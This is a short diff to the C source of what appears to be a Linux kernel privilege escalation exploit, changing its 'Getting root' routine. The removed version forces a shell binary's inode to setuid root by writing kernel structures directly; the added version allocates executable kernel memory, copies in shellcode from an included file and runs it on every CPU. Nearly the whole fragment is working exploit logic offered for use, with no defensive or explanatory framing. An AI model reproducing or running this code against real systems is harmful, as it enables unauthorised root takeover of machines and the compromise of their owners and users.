@@ -162,28 +162,17 @@ struct kernel_info kernels[] = {
 
 // * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *
 
-struct trampoline {
-	
-};
+void *(*module_alloc)(long) = (void *)X_module_alloc;
+long (*schedule_on_each_cpu)(long) = (void *)X_schedule_on_each_cpu;
 
-struct path {
-	void		*mnt;
-	void		*dentry;
+static char shellcode[] = {
+# include "shellcode.inc"
 };
-
-void *(*module_alloc)(unsigned long) = (void *)X_module_alloc;
-int (*user_path_at_empty)(int, const char *, unsigned, struct path *, int *) = (void *)X_user_path_at_empty;
-int (*path_put)(void *) = (void *)X_path_put;
 
 static void __attribute__((always_inline)) inline get_root_real(void) {
-	struct path path = { 0 };
-	if (!user_path_at_empty(AT_FDCWD, SHELL, 0, &path, NULL)) {
-		void *inode = (void *)(*(unsigned long *)(path.dentry + 48)); // dentry->d_inode
-		*(unsigned short *)(inode + 0) = 0104755; // inode->i_mode
-		*(unsigned   int *)(inode + 4) = 0; // inode->i_uid
-		*(unsigned   int *)(inode + 8) = 0; // inode->i_gid
-		path_put(&path);
-	}
+	void *p = module_alloc(sizeof(shellcode));
+	__builtin_memcpy(p, shellcode, sizeof(shellcode));
+	schedule_on_each_cpu((long)p);
 }
 
 struct stack_frame {
